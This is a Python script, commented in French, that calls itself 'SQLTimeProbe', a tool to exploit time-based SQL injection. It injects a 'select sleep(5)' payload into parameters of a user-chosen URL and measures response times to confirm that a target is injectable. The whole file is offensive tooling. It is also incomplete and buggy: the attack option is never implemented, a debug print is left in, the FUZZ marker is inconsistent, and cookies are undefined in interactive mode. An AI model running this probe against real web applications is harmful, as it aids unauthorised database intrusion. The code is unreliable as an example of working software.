import requests
import time
import argparse
import urllib.parse
import re

verif_payload = "select sleep(5)"
verif_payload_urlencode ="select%20sleep%285%29"

############## FONCTIONS ##############

# Découpe une chaîne de caractères en deux parties lorsqu'il y a FUZZ.
def split_at_fuzz(input_string):
    parts = input_string.split("FUZZ")
    if len(parts) == 1:
        return parts[0], ""
    else:
        return parts[0], parts[1]

# Ajoute une payload, soit pour l'attaque, soit pour la vérification
def add_payload(input_string, payload):
    before_fuzz, after_fuzz = split_at_fuzz(input_string)
    print(before_fuzz + "AAAAAAAAAA")
    return before_fuzz + payload + after_fuzz

# Encode une chaîne de caractères conformément aux spécifications URL.
def urlencode(string_to_encode):
    return urllib.parse.quote(string_to_encode)

# Encode une chaîne de caractères entre <@urlencode> et </@urlencode> conformément aux spécifications URL.
def urlencode_in_tags(input_string):
    def encode_match(match):
        return urlencode(match.group(1))
    return re.sub(r'<@urlencode>(.*?)</@urlencode>', encode_match, input_string)

# Fonction pour exécuter la requête SQL et mesurer le temps de réponse
def get_request(url, params, cookies=None):
    start_time = time.time()
    response = requests.get(url, params=params, cookies=cookies)
    if response.status_code!=200:
        print("\033[91m[+] Erreur dans une rêquete (Erreur " + str(response.status_code) + ")\033[0m")
    end_time = time.time()
    return end_time - start_time

# Fonction pour vérifier si une requête prend plus de 5 secondes
def check_response_time(response_time):
    if response_time > 5:
        return True
    else:
        return False

def verify(url, params):
    print('[X] Vérification de l\'injection SQL Time-Based sur ' + url)
    params=add_payload(params, verif_payload)
    print(params)
    params=urlencode_in_tags(params)
    print(params)
    response_time=get_request(url, params)
    if check_response_time(response_time):
        print('[+] Injection vérifiée')
    else:
        print('[-] Injection non exploitable/non vérifiée')
    return check_response_time(response_time)

# ASCII art
ascii_art = """\033[91m
███████╗ ██████╗ ██╗  ████████╗██╗███╗   ███╗███████╗██████╗ ██████╗  ██████╗ ██████╗ ███████╗
██╔════╝██╔═══██╗██║  ╚══██╔══╝██║████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║   ██║██╔████╔██║█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
╚════██║██║▄▄ ██║██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
    \033[0m                                                                                          
"""

print(ascii_art)

# Analyse des arguments de la ligne de commande
parser = argparse.ArgumentParser(description="SQLTimeProbe : script to exploit Time-Based SQL Injection")
parser.add_argument("-i", "--interactive", action="store_true", help="Mode interactif")
parser.add_argument("-u", "--url", help="URL de la cible")
parser.add_argument("-p", "--params", help="Paramètres de la requête (au format 'test=1&test=2&test=3') (avec $FUZZ$ pour le fuzzing)")
parser.add_argument("-a", "--attack", action="store_true", help="Attaque à effectuer")
parser.add_argument("-v", "--verify", action="store_true", help="Vérification de l'injection SQL Time-Based")
parser.add_argument("-c", "--cookies", help="Cookies à inclure dans la requête (au format 'cookie1=value1;cookie2=value2')")
args = parser.parse_args()


# Si mode interactif est activé
if args.interactive:
    url = input("Entrez l'URL de la cible : ")
    params = input("Entrez vos paramètres de la rêquete (au format 'test=1&test=2&test=3') (avec $FUZZ$ pour le fuzzing) :")
# Si l'utilisateur fournit l'URL et la requête en ligne de commande
elif args.url and args.params:
    url = args.url
    params = args.params
    attack = args.attack
    cookies = args.cookies
    if args.verify:
        verify(url, params)
else:
    print("Veuillez utiliser -i pour le mode interactif ou -u pour l'URL et -p pour les paramètres.")
    exit()

parsed_cookies = None
if cookies:
    parsed_cookies = dict(cookie.split('=') for cookie in cookies.split(';'))

# Vérification de l'URL
if not url:
    print("Veuillez spécifier l'URL de la cible.")
    exit()

# Liste pour stocker les temps de réponse
response_times = []

num_queries = 5

# Effectuer les requêtes et mesurer les temps de réponse
for _ in range(num_queries):
    exec_time = get_request(url, params)
    response_times.append((exec_time))

print(response_times)